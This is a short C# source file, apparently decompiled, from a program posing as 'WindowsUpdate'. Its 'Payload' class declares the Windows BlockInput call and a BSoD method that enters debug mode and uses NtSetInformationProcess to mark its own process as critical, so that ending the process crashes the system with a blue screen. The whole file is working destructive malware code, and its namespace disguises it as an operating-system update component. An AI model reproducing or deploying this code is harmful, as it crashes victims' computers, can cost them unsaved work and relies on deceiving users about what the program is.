using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WindowsUpdate
{
	// Token: 0x02000005 RID: 5
	internal class Payload
	{
		// Token: 0x06000014 RID: 20
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x06000015 RID: 21
		[DllImport("user32.dll")]
		public static extern bool BlockInput(bool fBlockIt);

		// Token: 0x06000016 RID: 22 RVA: 0x00002448 File Offset: 0x00000648
		public static void BSoD()
		{
			int num = 1;
			Process.EnterDebugMode();
			Payload.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref num, 4);
		}
	}
}
